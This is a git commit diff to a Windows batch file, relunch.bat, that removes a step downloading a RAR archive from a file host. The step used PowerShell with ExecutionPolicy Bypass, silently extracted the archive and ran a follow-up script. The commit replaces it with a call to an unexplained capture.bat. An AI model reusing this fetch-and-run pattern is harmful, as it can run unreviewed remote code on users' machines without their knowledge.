3f615aaebc75500e60193193ccc26a6262a2a6a6
DThang200 <thangdao202@gmail.com>
2025-07-29 12:01:22 +0700

    update

--- relunch.bat
+++ relunch.bat
@@ -1,14 +1,9 @@
 @echo off 
  
-set urls=https://st1.ranoz.gg/TjQEaLA2-Delta2679_lite.rar 
-call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "TAI_FILE_BACKUP-27/07/2025-18:27" 
+call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "CAPTURE-29/07/2025-12:01" 
 if %errorlevel% equ 0 ( 
-   echo done 
+echo done 
 ) else ( 
-    call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "TAI_FILE_BACKUP-27/07/2025-18:27" 
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://st1.ranoz.gg/TjQEaLA2-Delta2679_lite.rar' -OutFile '%USERPROFILE%\Downloads\Delta2679_lite.rar'}" 
-    "C:\Program Files\WinRAR\WinRAR.exe" x -ibck -o+ "%USERPROFILE%\Downloads\Delta2679_lite.rar" "%USERPROFILE%\Downloads\" 
-    call "%USERPROFILE%\Desktop\dow-code\test-something\asset\after-backup.bat" 
-    ) 
-    timeout /t 5 
-    exit 
+call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "CAPTURE-29/07/2025-12:01" 
+    call "%USERPROFILE%\Desktop\dow-code\test-something\asset\capture.bat" 
+) 
